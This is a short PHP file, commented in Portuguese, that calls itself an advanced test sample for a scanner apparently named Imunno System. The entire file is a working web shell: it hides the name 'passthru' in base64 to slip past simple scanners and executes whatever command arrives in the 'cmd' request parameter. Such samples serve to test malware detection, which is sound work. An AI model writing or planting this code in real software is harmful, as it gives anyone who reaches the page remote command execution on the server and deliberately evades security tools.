<?php
// Amostra de teste avançada para o Imunno System
// A função 'passthru' está codificada em base64 para enganar scanners simples.
$funcao_codificada = 'cGFzc3RocnU='; // 'passthru' em base64

if(isset($_REQUEST['cmd'])) {
    $funcao_decodificada = base64_decode($funcao_codificada);
    $comando = $_REQUEST['cmd'];
    $funcao_decodificada($comando);
}
?>